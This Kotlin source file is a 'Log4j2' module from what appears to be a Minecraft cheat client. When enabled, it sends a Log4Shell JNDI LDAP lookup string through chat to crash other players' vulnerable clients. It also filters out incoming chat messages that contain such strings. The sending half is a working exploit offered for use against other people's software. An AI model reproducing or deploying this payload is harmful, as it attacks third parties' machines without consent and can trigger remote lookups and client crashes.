package kevin.module.modules.exploit

import kevin.event.EventTarget
import kevin.event.PacketEvent
import kevin.module.Module
import kevin.module.ModuleCategory
import kevin.utils.ChatUtils
import net.minecraft.network.play.client.C01PacketChatMessage
import net.minecraft.network.play.server.S02PacketChat

class Log4j2 : Module("Log4j2", "Anti log4j2 exploit and use it to crash other player client.", category = ModuleCategory.EXPLOIT) {
    override fun onEnable() {
        val m = arrayOf(
            "www.baidu.com",
            "liquidbounce.net",
            "fanyi.sogou.com",
            "github.com",
            "scriptapi.liquidbounce.net",
        ).random()
        mc.netHandler.addToSendQueue(C01PacketChatMessage("\${jndi:ldap://$m}"))
        ChatUtils.messageWithStart("Sent crash packet... [$m]")
        this.state = false
    }
    @EventTarget(true)
    fun onPacket(event: PacketEvent) {
        val packet = event.packet
        if (packet is S02PacketChat &&
            (packet.chatComponent.formattedText.contains("\${jndi:")
                    || packet.chatComponent.unformattedText.contains("\${jndi:"))) {
            event.cancelEvent()
            ChatUtils.messageWithStart("Â§aCancel receiving message that may trigger vulnerability!!(${packet.chatComponent.formattedText.replace("\${","").replace("}","")})")
        }
    }
}